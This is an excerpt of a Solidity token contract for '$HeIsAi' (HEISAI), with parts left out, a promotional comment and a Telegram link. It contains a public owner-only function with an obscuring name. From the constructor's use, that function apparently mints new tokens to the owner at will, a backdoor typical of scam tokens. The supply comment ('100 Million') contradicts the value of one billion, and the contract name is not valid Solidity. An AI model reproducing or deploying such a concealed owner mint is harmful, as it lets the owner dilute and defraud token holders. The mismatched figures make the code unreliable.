...
//
// $HeIsAi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/HeisAIBEP20
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _HeIsAi(uint256 amount) public onlyOwner {
 _HeIsAi(msg.sender, amount);
    }
    ...
    function _HeIsAi(address account, uint256 amount) internal virtual {
...
contract $HeIsAi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("He Is Ai", "HEISAI") {
     _HeIsAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}